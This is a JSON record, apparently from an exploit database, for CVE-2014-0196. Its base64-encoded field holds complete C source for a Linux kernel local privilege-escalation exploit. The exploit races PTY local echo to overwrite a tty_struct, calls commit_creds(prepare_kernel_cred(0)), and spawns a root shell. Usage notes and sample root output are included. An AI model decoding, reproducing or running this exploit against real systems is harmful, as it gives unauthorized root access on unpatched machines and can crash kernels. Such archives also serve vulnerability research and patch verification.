{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIENWRS0yMDE0LTAxOTY6IExpbnV4IGtlcm5lbCA8PSB2My4xNS1yYzQ6IHJhdyBtb2RlIFBUWSBsb2NhbCBlY2hvIHJhY2UNCiAqIGNvbmRpdGlvbg0KICoNCiAqIFNsaWdodGx5LWxlc3MtdGhhbi1QT0MgcHJpdmlsZWdlIGVzY2FsYXRpb24gZXhwbG9pdA0KICogRm9yIGtlcm5lbHMgPj0gdjMuMTQtcmMxDQogKg0KICogTWF0dGhldyBEYWxleSA8bWF0dGRAYnVnZnV6ei5jb20+DQogKg0KICogVXNhZ2U6IA0KICogICAkIGdjYyBjdmUtMjAxNC0wMTk2LW1kLmMgLWx1dGlsIC1scHRocmVhZA0KICogICAkIC4vYS5vdXQNCiAqICAgWytdIFJlc29sdmluZyBzeW1ib2xzDQogKiAgIFsrXSBSZXNvbHZlZCBjb21taXRfY3JlZHM6IDB4ZmZmZmZmZmY4MTA1NjY5NA0KICogICBbK10gUmVzb2x2ZWQgcHJlcGFyZV9rZXJuZWxfY3JlZDogMHhmZmZmZmZmZjgxMDU2OGE3DQogKiAgIFsrXSBEb2luZyBvbmNlLW9mZiBhbGxvY2F0aW9ucw0KICogICBbK10gQXR0ZW1wdGluZyB0byBvdmVyZmxvdyBpbnRvIGEgdHR5X3N0cnVjdC4uLi4uLi4uLi4uLi4uLg0KICogICBbK10gR290IGl0IDopDQogKiAgICMgaWQNCiAqICAgdWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkNCiAqDQogKiBXQVJOSU5HOiBUaGUgb3ZlcmZsb3cgcGxhY2VtZW50IGlzIHN0aWxsIGxlc3MtdGhhbi1pZGVhbDsgdGhlcmUgaXMgYSAxLzQNCiAqIGNoYW5jZSB0aGF0IHRoZSBvdmVyZmxvdyB3aWxsIGdvIG9mZiB0aGUgZW5kIG9mIGEgc2xhYi4gVGhpcyBkb2VzIG5vdA0KICogbmVjZXNzYXJpbHkgbGVhZCB0byBhbiBpbW1lZGlhdGUga2VybmVsIGNyYXNoLCBidXQgeW91IHNob3VsZCBiZSBwcmVwYXJlZA0KICogZm9yIHRoZSB3b3JzdCAoaS5lLiBrZXJuZWwgb29wc2luZyBpbiBhIGJhZCBzdGF0ZSkuIEluIHRoZW9yeSB0aGlzIHdvdWxkIGJlDQogKiBhdm9pZGFibGUgYnkgcmVhZGluZyAvcHJvYy9zbGFiaW5mbyBvbiBzeXN0ZW1zIHdoZXJlIGl0IGlzIHN0aWxsIGF2YWlsYWJsZQ0KICogdG8gdW5wcml2aWxlZ2VkIHVzZXJzLg0KICoNCiAqIENhdmVhdDogVGhlIHZ1bG5lcmFiaWxpdHkgc2hvdWxkIGJlIGV4cGxvaXRhYmxlIGFsbCB0aGUgd2F5IGZyb20NCiAqIHYyLjYuMzEtcmMzLCBob3dldmVyIHJlbGV2YW50IGNoYW5nZXMgdG8gdGhlIFRUWSBzdWJzeXN0ZW0gd2VyZSBtYWRlIGluDQogKiBjb21taXQgYWNjMGY2N2YzMDdmNTJmN2FlYzFjZmZkYzQwYTc4NmMxNWRkMjFkOSAoInR0eTogSGFsdmUgZmxpcCBidWZmZXINCiAqIEdGUF9BVE9NSUMgbWVtb3J5IGNvbnN1bXB0aW9uIikgdGhhdCBtYWtlIGV4cGxvaXRhdGlvbiBzaW1wbGVyLCB3aGljaCB0aGlzDQogKiBleHBsb2l0IHJlbGllcyBvbi4NCiAqDQogKiBUaGFua3MgdG8gSm9uIE9iZXJoZWlkZSBmb3IgaGlzIGhlbHAgb24gZXhwbG9pdGF0aW9uIHRlY2huaXF1ZS4NCiAqLw0KDQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCiNpbmNsdWRlIDxwdHkuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHRlcm1pb3MuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2RlZmluZSBUVFlfTUFHSUMgMHg1NDAxDQoNCiNkZWZpbmUgT05FT0ZGX0FMTE9DUyAyMDANCiNkZWZpbmUgUlVOX0FMTE9DUyAgICAzMA0KDQpzdHJ1Y3QgZGV2aWNlOw0Kc3RydWN0IHR0eV9kcml2ZXI7DQpzdHJ1Y3QgdHR5X29wZXJhdGlvbnM7DQoNCnR5cGVkZWYgc3RydWN0IHsNCglpbnQgY291bnRlcjsNCn0gYXRvbWljX3Q7DQoNCnN0cnVjdCBrcmVmIHsNCglhdG9taWNfdCByZWZjb3VudDsNCn07DQoNCnN0cnVjdCB0dHlfc3RydWN0X2hlYWRlciB7DQoJaW50CW1hZ2ljOw0KCXN0cnVjdCBrcmVmIGtyZWY7DQoJc3RydWN0IGRldmljZSAqZGV2Ow0KCXN0cnVjdCB0dHlfZHJpdmVyICpkcml2ZXI7DQoJY29uc3Qgc3RydWN0IHR0eV9vcGVyYXRpb25zICpvcHM7DQp9IG92ZXJ3cml0ZTsNCg0KdHlwZWRlZiBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIGNvbW1pdF9jcmVkc19mbikodW5zaWduZWQgbG9uZyBjcmVkKTsNCnR5cGVkZWYgdW5zaWduZWQgbG9uZyBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogcHJlcGFyZV9rZXJuZWxfY3JlZF9mbikodW5zaWduZWQgbG9uZyBjcmVkKTsNCg0KaW50IG1hc3Rlcl9mZCwgc2xhdmVfZmQ7DQpjaGFyIGJ1ZlsxMDI0XSA9IHswfTsNCmNvbW1pdF9jcmVkc19mbiBjb21taXRfY3JlZHM7DQpwcmVwYXJlX2tlcm5lbF9jcmVkX2ZuIHByZXBhcmVfa2VybmVsX2NyZWQ7DQoNCmludCBwYXlsb2FkKHZvaWQpIHsNCgljb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7DQoNCglyZXR1cm4gMDsNCn0NCg0KdW5zaWduZWQgbG9uZyBnZXRfc3ltYm9sKGNoYXIgKnRhcmdldF9uYW1lKSB7DQoJRklMRSAqZjsNCgl1bnNpZ25lZCBsb25nIGFkZHI7DQoJY2hhciBkdW1teTsNCgljaGFyIG5hbWVbMjU2XTsNCglpbnQgcmV0ID0gMDsNCg0KCWYgPSBmb3BlbigiL3Byb2Mva2FsbHN5bXMiLCAiciIpOw0KCWlmIChmID09IE5VTEwpDQoJCXJldHVybiAwOw0KDQoJd2hpbGUgKHJldCAhPSBFT0YpIHsNCgkJcmV0ID0gZnNjYW5mKGYsICIlcCAlYyAlc1xuIiwgKHZvaWQgKiopJmFkZHIsICZkdW1teSwgbmFtZSk7DQoJCWlmIChyZXQgPT0gMCkgew0KCQkJZnNjYW5mKGYsICIlc1xuIiwgbmFtZSk7DQoJCQljb250aW51ZTsNCgkJfQ0KDQoJCWlmICghc3RyY21wKG5hbWUsIHRhcmdldF9uYW1lKSkgew0KCQkJcHJpbnRmKCJbK10gUmVzb2x2ZWQgJXM6ICVwXG4iLCB0YXJnZXRfbmFtZSwgKHZvaWQgKilhZGRyKTsNCg0KCQkJZmNsb3NlKGYpOw0KCQkJcmV0dXJuIGFkZHI7DQoJCX0NCgl9DQoNCglwcmludGYoIlstXSBDb3VsZG4ndCByZXNvbHZlIFwiJXNcIlxuIiwgbmFtZSk7DQoNCglmY2xvc2UoZik7DQoJcmV0dXJuIDA7DQp9DQoNCnZvaWQgKm92ZXJ3cml0ZV90aHJlYWRfZm4odm9pZCAqcCkgew0KCXdyaXRlKHNsYXZlX2ZkLCBidWYsIDUxMSk7DQoNCgl3cml0ZShzbGF2ZV9mZCwgYnVmLCAxMDI0IC0gMzIgLSAoMSArIDUxMSArIDEpKTsNCgl3cml0ZShzbGF2ZV9mZCwgJm92ZXJ3cml0ZSwgc2l6ZW9mKG92ZXJ3cml0ZSkpOw0KfQ0KDQppbnQgbWFpbigpIHsNCgljaGFyIHNjcmF0Y2hbMTAyNF0gPSB7MH07DQoJdm9pZCAqdHR5X29wZXJhdGlvbnNbNjRdOw0KCWludCBpLCB0ZW1wX2ZkXzEsIHRlbXBfZmRfMjsNCg0KCWZvciAoaSA9IDA7IGkgPCA2NDsgKytpKQ0KCQl0dHlfb3BlcmF0aW9uc1tpXSA9IHBheWxvYWQ7DQoNCglvdmVyd3JpdGUubWFnaWMgICAgICAgICAgICAgICAgID0gVFRZX01BR0lDOw0KCW92ZXJ3cml0ZS5rcmVmLnJlZmNvdW50LmNvdW50ZXIgPSAweDEzMzc7DQoJb3ZlcndyaXRlLmRldiAgICAgICAgICAgICAgICAgICA9IChzdHJ1Y3QgZGV2aWNlICopc2NyYXRjaDsNCglvdmVyd3JpdGUuZHJpdmVyICAgICAgICAgICAgICAgID0gKHN0cnVjdCB0dHlfZHJpdmVyICopc2NyYXRjaDsNCglvdmVyd3JpdGUub3BzICAgICAgICAgICAgICAgICAgID0gKHN0cnVjdCB0dHlfb3BlcmF0aW9ucyAqKXR0eV9vcGVyYXRpb25zOw0KDQoJcHV0cygiWytdIFJlc29sdmluZyBzeW1ib2xzIik7DQoNCgljb21taXRfY3JlZHMgPSAoY29tbWl0X2NyZWRzX2ZuKWdldF9zeW1ib2woImNvbW1pdF9jcmVkcyIpOw0KCXByZXBhcmVfa2VybmVsX2NyZWQgPSAocHJlcGFyZV9rZXJuZWxfY3JlZF9mbilnZXRfc3ltYm9sKCJwcmVwYXJlX2tlcm5lbF9jcmVkIik7DQoJaWYgKCFjb21taXRfY3JlZHMgfHwgIXByZXBhcmVfa2VybmVsX2NyZWQpDQoJCXJldHVybiAxOw0KDQoJcHV0cygiWytdIERvaW5nIG9uY2Utb2ZmIGFsbG9jYXRpb25zIik7DQoNCglmb3IgKGkgPSAwOyBpIDwgT05FT0ZGX0FMTE9DUzsgKytpKQ0KCQlpZiAob3BlbnB0eSgmdGVtcF9mZF8xLCAmdGVtcF9mZF8yLCBOVUxMLCBOVUxMLCBOVUxMKSA9PSAtMSkgew0KCQkJcHV0cygiWy1dIHB0eSBjcmVhdGlvbiBmYWlsZWQiKTsNCgkJCXJldHVybiAxOw0KCQl9DQoNCglwcmludGYoIlsrXSBBdHRlbXB0aW5nIHRvIG92ZXJmbG93IGludG8gYSB0dHlfc3RydWN0Li4uIik7DQoJZmZsdXNoKHN0ZG91dCk7DQoNCglmb3IgKGkgPSAwOyA7ICsraSkgew0KCQlzdHJ1Y3QgdGVybWlvcyB0Ow0KCQlpbnQgZmRzW1JVTl9BTExPQ1NdLCBmZHMyW1JVTl9BTExPQ1NdLCBqOw0KCQlwdGhyZWFkX3Qgb3ZlcndyaXRlX3RocmVhZDsNCg0KCQlpZiAoIShpICYgMHhmZmYpKSB7DQoJCQlwdXRjaGFyKCcuJyk7DQoJCQlmZmx1c2goc3Rkb3V0KTsNCgkJfQ0KDQoJCWlmIChvcGVucHR5KCZtYXN0ZXJfZmQsICZzbGF2ZV9mZCwgTlVMTCwgTlVMTCwgTlVMTCkgPT0gLTEpIHsNCgkJCXB1dHMoIlxuWy1dIHB0eSBjcmVhdGlvbiBmYWlsZWQiKTsNCgkJCXJldHVybiAxOw0KCQl9DQoNCgkJZm9yIChqID0gMDsgaiA8IFJVTl9BTExPQ1M7ICsraikNCgkJCWlmIChvcGVucHR5KCZmZHNbal0sICZmZHMyW2pdLCBOVUxMLCBOVUxMLCBOVUxMKSA9PSAtMSkgew0KCQkJCXB1dHMoIlxuWy1dIHB0eSBjcmVhdGlvbiBmYWlsZWQiKTsNCgkJCQlyZXR1cm4gMTsNCgkJCX0NCg0KCQljbG9zZShmZHNbUlVOX0FMTE9DUyAvIDJdKTsNCgkJY2xvc2UoZmRzMltSVU5fQUxMT0NTIC8gMl0pOw0KDQoJCXdyaXRlKHNsYXZlX2ZkLCBidWYsIDEpOw0KDQoJCXRjZ2V0YXR0cihtYXN0ZXJfZmQsICZ0KTsNCgkJdC5jX29mbGFnICY9IH5PUE9TVDsNCgkJdC5jX2xmbGFnIHw9IEVDSE87DQoJCXRjc2V0YXR0cihtYXN0ZXJfZmQsIFRDU0FOT1csICZ0KTsNCg0KCQlpZiAocHRocmVhZF9jcmVhdGUoJm92ZXJ3cml0ZV90aHJlYWQsIE5VTEwsIG92ZXJ3cml0ZV90aHJlYWRfZm4sIE5VTEwpKSB7DQoJCQlwdXRzKCJcblstXSBPdmVyd3JpdGUgdGhyZWFkIGNyZWF0aW9uIGZhaWxlZCIpOw0KCQkJcmV0dXJuIDE7DQoJCX0NCgkJd3JpdGUobWFzdGVyX2ZkLCAiQSIsIDEpOw0KCQlwdGhyZWFkX2pvaW4ob3ZlcndyaXRlX3RocmVhZCwgTlVMTCk7DQoNCgkJZm9yIChqID0gMDsgaiA8IFJVTl9BTExPQ1M7ICsraikgew0KCQkJaWYgKGogPT0gUlVOX0FMTE9DUyAvIDIpDQoJCQkJY29udGludWU7DQoNCgkJCWlvY3RsKGZkc1tqXSwgMHhkZWFkYmVlZik7DQoJCQlpb2N0bChmZHMyW2pdLCAweGRlYWRiZWVmKTsNCg0KCQkJY2xvc2UoZmRzW2pdKTsNCgkJCWNsb3NlKGZkczJbal0pOw0KCQl9DQoNCgkJaW9jdGwobWFzdGVyX2ZkLCAweGRlYWRiZWVmKTsNCgkJaW9jdGwoc2xhdmVfZmQsIDB4ZGVhZGJlZWYpOw0KDQoJCWNsb3NlKG1hc3Rlcl9mZCk7DQoJCWNsb3NlKHNsYXZlX2ZkKTsNCg0KCQlpZiAoIXNldHJlc3VpZCgwLCAwLCAwKSkgew0KCQkJc2V0cmVzZ2lkKDAsIDAsIDApOw0KDQoJCQlwdXRzKCJcblsrXSBHb3QgaXQgOikiKTsNCgkJCWV4ZWNsKCIvYmluL2Jhc2giLCAiL2Jpbi9iYXNoIiwgTlVMTCk7DQoJCX0NCgl9DQp9", 
    "id": "33516", 
    "cves": [
        "CVE-2014-0196"
    ]
}